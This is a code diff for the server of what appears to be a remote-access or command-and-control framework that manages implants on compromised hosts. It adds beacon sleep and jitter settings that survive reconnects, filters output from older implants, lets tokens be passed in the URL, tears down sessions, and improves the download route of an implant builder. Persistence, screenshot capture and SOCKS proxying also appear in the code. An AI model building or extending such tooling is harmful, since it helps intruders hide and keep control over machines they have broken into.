@@ -44,6 +44,8 @@ const AdmZip = require('adm-zip');
 const os = require('os');
 const { SocksManager } = require('./socks5');
 const socksManager = new SocksManager();
+/** hostname|mac ? { sleep, jitter } so sleep survives session delete/reconnect */
+const beaconSleepPrefs = new Map();
 
 const app = express();
 const server = http.createServer(app);
@@ -1246,6 +1248,25 @@ function createTcpServer() {
             console.error('[TCP] Auto setpersistence failed:', e.message);
           }
         }, 800);
+
+        // Re-apply saved Cobalt-style sleep after reconnect (keyed by host+mac)
+        setTimeout(() => {
+          const live = clients.get(clientId);
+          if (!live || !live.socket || !live.active) return;
+          const prefKey = `${String(clientInfo.hostname || '').toLowerCase()}|${String(clientInfo.macAddress || '').toLowerCase()}`;
+          const pref = beaconSleepPrefs.get(prefKey);
+          if (!pref) return;
+          try {
+            const cmd = `sleep ${pref.sleep} ${pref.jitter}`;
+            live.beaconSleep = pref.sleep;
+            live.beaconJitter = pref.jitter;
+            live.pendingSleepAck = true;
+            live.socket.write(JSON.stringify({ type: 'command', content: cmd }) + '\n');
+            console.log(`[TCP] Re-applied ${cmd} -> ${clientInfo.hostname}`);
+          } catch (e) {
+            console.error('[TCP] Re-apply sleep failed:', e.message);
+          }
+        }, 1600);
         
         // Send email notification
         sendConnectionAlert(clientInfo).catch(err => {
@@ -1293,6 +1314,15 @@ function createTcpServer() {
           const respTrim = (message.content !== undefined && message.content !== null)
             ? String(message.content).trim()
             : '';
+
+          // Old implants run `cmd /c sleep ?` ? "Invalid command or argument" ? drop that noise
+          if (client.pendingSleepAck) {
+            client.pendingSleepAck = false;
+            if (/invalid command/i.test(respTrim)) {
+              console.log(`[TCP] sleep ack ignored (implant needs rebuild for native sleep): ${client.hostname}`);
+              continue;
+            }
+          }
 
           // Auto-pull screenshot BMP from implant to server after capture
           const snapMatch = respTrim.match(/Snapshot saved as:\s*(.+)$/i);
@@ -1614,7 +1644,11 @@ function getUser(username) {
 
 function requireAuth(req, res, next) {
   const header = req.headers['authorization'] || '';
-  const token = header.startsWith('Bearer ') ? header.slice(7) : null;
+  let token = header.startsWith('Bearer ') ? header.slice(7) : null;
+  // Allow ?token= for <a href> file downloads (Bearer headers can't be set on plain links)
+  if (!token && req.query && typeof req.query.token === 'string' && req.query.token.trim()) {
+    token = req.query.token.trim();
+  }
   if (!token) return res.status(401).json({ error: 'Missing token' });
   try {
     const payload = jwt.verify(token, JWT_SECRET);
@@ -1958,6 +1992,59 @@ io.on('connection', (socket) => {
               buffer: Buffer.alloc(0),
               timeout: null
             };
+          } else if (tl === 'sleep' || tl.startsWith('sleep ') || tl === 'sleepinfo' || tl === 'sleep?') {
+            // Parse + remember sleep even if implant build is old (shell would fail)
+            const parts = t.split(/\s+/);
+            let sleepSec = Number(client.beaconSleep) || 5;
+            let jitter = Number(client.beaconJitter) || 0;
+            if (tl === 'sleepinfo' || tl === 'sleep?' || parts.length === 1) {
+              io.emit('commandResponse', {
+                clientId,
+                response: `sleep=${sleepSec}s jitter=${jitter}%\nUsage: sleep <seconds> [jitter%]`,
+                timestamp: new Date(),
+              });
+              if (tl === 'sleepinfo' || tl === 'sleep?') {
+                // still probe implant if it supports sleepinfo
+                tcpPayload = 'sleepinfo';
+              } else {
+                return; // bare "sleep" ? info only, no shell
+              }
+            } else {
+              const s = parseInt(parts[1], 10);
+              if (!Number.isFinite(s) || s < 0 || s > 86400) {
+                io.emit('commandResponse', {
+                  clientId,
+                  response: 'Invalid sleep seconds (use 0-86400)',
+                  timestamp: new Date(),
+                });
+                return;
+              }
+              sleepSec = s;
+              if (parts.length >= 3) {
+                const j = parseInt(parts[2], 10);
+                if (!Number.isFinite(j) || j < 0 || j > 99) {
+                  io.emit('commandResponse', {
+                    clientId,
+                    response: 'Invalid jitter (use 0-99)',
+                    timestamp: new Date(),
+                  });
+                  return;
+                }
+                jitter = j;
+              }
+              client.beaconSleep = sleepSec;
+              client.beaconJitter = jitter;
+              client.pendingSleepAck = true;
+              const prefKey = `${String(client.hostname || '').toLowerCase()}|${String(client.macAddress || '').toLowerCase()}`;
+              beaconSleepPrefs.set(prefKey, { sleep: sleepSec, jitter });
+              tcpPayload = `sleep ${sleepSec} ${jitter}`;
+              // Immediate UI ack (implant OK may also arrive; Invalid from old builds is filtered)
+              io.emit('commandResponse', {
+                clientId,
+                response: `OK sleep=${sleepSec}s jitter=${jitter}% (applies on disconnect/reconnect)`,
+                timestamp: new Date(),
+              });
+            }
           }
         }
         const commandData = {
@@ -2119,22 +2206,27 @@ io.on('connection', (socket) => {
     socket.emit('commandHistory', commandHistory);
   });
   
-  // Delete a session (offline preferred; active sessions are force-disconnected first)
+  // Delete a session: force-drop TCP so implant exits handleShell and reconnects as a new session
   socket.on('deleteClient', (data) => {
     try {
       const clientId = typeof data === 'string' ? data : (data && data.clientId);
       if (!clientId) return socket.emit('clientDeleteError', { error: 'clientId required' });
       const client = clients.get(clientId);
       if (client) {
-        if (client.active && client.socket) {
-          try { client.socket.destroy(); } catch (e) {}
+        try { socksManager.stop(clientId); } catch (_) {}
+        if (client.socket) {
+          try { client.socket.setTimeout(1); } catch (_) {}
+          try { client.socket.destroy(); } catch (_) {}
         }
         clients.delete(clientId);
         clientSessions.delete(clientId);
       }
       try {
         if (db) {
-          db.run(`DELETE FROM clients WHERE id = '${String(clientId).replace(/'/g, "''")}'`);
+          const safeId = String(clientId).replace(/'/g, "''");
+          db.run(`DELETE FROM client_commands WHERE clientId = '${safeId}'`);
+          db.run(`DELETE FROM client_sessions WHERE clientId = '${safeId}'`);
+          db.run(`DELETE FROM clients WHERE id = '${safeId}'`);
           persistDb();
         }
       } catch (dbErr) {
@@ -2142,6 +2234,8 @@ io.on('connection', (socket) => {
       }
       io.emit('clientRemoved', { id: clientId });
       socket.emit('clientDeleted', { id: clientId });
+      // Refresh list so dashboard stays in sync when implant check-ins again
+      io.emit('clientsList', Array.from(clients.values()).map(mapClientForGui));
     } catch (e) {
       socket.emit('clientDeleteError', { error: e.message || 'Delete failed' });
     }
@@ -2654,9 +2748,24 @@ app.post('/api/builder/generate', requireAuth, async (req, res) => {
 app.get('/api/builder/download/:id', requireAuth, (req, res) => {
   try {
     const found = implantBuilder.getBuildPath(req.params.id);
-    if (!found) return res.status(404).json({ error: 'Build not found' });
-    res.download(found.filePath, found.meta.fileName);
+    if (!found) {
+      console.warn(`[BUILDER] Download 404: ${req.params.id}`);
+      return res.status(404).json({ error: 'Build not found or file missing on disk' });
+    }
+    const abs = path.resolve(found.filePath);
+    if (!fs.existsSync(abs)) {
+      console.warn(`[BUILDER] Download missing file: ${abs}`);
+      return res.status(404).json({ error: 'Build file missing on disk' });
+    }
+    console.log(`[BUILDER] Download ${found.meta.fileName} (${found.meta.size || '?'} bytes) -> ${req.user?.sub || '?'}`);
+    res.download(abs, found.meta.fileName, (err) => {
+      if (err) {
+        console.error(`[BUILDER] Download stream error:`, err.message);
+        if (!res.headersSent) res.status(500).json({ error: err.message || 'Download failed' });
+      }
+    });
   } catch (e) {
+    console.error('[BUILDER] Download failed:', e.message);
     res.status(500).json({ error: e.message || 'Download failed' });
   }
 });
